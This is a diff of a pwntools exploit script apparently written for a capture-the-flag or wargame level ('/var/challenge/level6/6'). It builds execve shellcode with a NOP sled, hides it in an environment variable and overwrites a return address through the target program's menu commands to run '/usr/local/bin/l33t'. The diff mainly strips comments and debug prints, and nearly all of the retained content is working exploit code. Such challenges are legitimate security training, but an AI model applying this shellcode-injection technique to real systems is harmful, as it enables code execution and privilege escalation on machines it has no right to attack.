@@ -8,20 +8,10 @@ from pwn import *
 # exe = context.binary = ELF(args.EXE or './6AAAAAAA')
 exe = context.binary = ELF(args.EXE or '/var/challenge/level6/6')
 
-
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
 l33tpath = '/usr/local/bin/l33t'
 shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
 nop_sled = b'\x90' * 200
 shellcode = nop_sled + shellcode
-
-payload = fit({
-    0: shellcode,
-})
 
 # Start with a custom empty env
 env = {
@@ -59,20 +49,11 @@ continue
 
 # The return address location to overwrite (from GDB inspection)
 return_addr = (0x7fffffffec48)
-# return_addr = 0x48ECFFFFFF7F # little endian
 
 # The address of the shellcode in the environment
-shellcode_addr = p64(0x7fffffffeec8 + 50)[:6]
-
+shellcode_addr = p64(0x7fffffffeec8 + 50)[:6] # + 50 to jump over the "L33T=" part of the env variable, and ignore the last 2 null bytes which are already null when copied correctly
 
 io = start()
-
-print("shellcode_addr", shellcode_addr)
-print("return addr", return_addr)
-
-# 0x56465f3dd120
-
-# input("Press Enter to continue...")
 
 # create a new dish
 io.sendline("n")
@@ -84,15 +65,6 @@ io.sendline("a 6")
 io.sendline("c 6=" + str(return_addr))
 # # change the spice effect to the shellcode address
 io.sendline(b"e 6=" + shellcode_addr)
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.interactive()
 
